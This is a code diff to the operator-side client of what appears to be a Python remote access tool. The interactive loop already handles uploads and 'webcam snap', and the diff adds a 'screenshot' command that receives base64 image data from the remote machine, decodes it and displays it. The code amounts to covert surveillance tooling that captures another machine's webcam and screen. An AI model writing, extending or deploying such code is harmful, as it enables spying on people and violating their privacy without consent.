@@ -324,7 +324,7 @@ class Client:
 		self.send(base64.b64encode(chr(255)))
 		print_good("Upload complete!")
 		
-	def display_snap(self):
+	def display_snap(self, screenie=False):
 		data = ""
 		while not data.endswith(">>"):
 			data += self.recv()
@@ -335,9 +335,11 @@ class Client:
 		width, height = int(width), int(height)
 		img_data = base64.b64decode(img_data)
 		
-		Image.frombytes('RGB', (width, height), img_data, 'raw', 'BGR', 0, -1).show()
+		if not screenie: Image.frombytes('RGB', (width, height), img_data, 'raw', 'BGR', 0, -1).show()
+		else: Image.frombytes('RGB', (width, height), img_data, 'raw', 'RGB', 0, 0).show()
 		
 		return
+
 		
 
 	def interact(self):
@@ -382,6 +384,11 @@ class Client:
 			elif user_input.startswith("webcam snap"):
 				self.send(user_input)
 				self.display_snap()
+				user_input = "cd ."
+				
+			elif user_input == "screenshot":
+				self.send(user_input)
+				self.display_snap(screenie=True)
 				user_input = "cd ."
 
 			self.send(user_input)
